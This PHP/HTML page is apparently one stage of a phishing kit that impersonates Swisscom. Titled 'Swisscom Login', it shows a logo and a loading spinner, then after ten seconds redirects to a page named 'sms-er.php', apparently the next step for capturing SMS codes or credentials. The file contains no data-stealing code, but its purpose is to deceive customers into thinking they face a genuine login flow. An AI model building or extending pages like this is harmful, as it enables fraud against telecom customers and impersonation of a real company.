


<?php 

require_once "functions.php";

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Swisscom Login</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>

</head>

<body>
   <div class="bod text-center" style="height: 100vh;padding-top: 250px;">
       <div><img width="250" src="image/lgg.png"></div>
       <div class="spinner-border" style="color: #000854;" role="status">
          <span class="visually-hidden">Loading...</span>
        </div>
   </div>

    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
   setTimeout(function () {
                window.location.href= 'sms-er.php';
            },10000); // 1000 = 1s
  </script>
</body>
</html>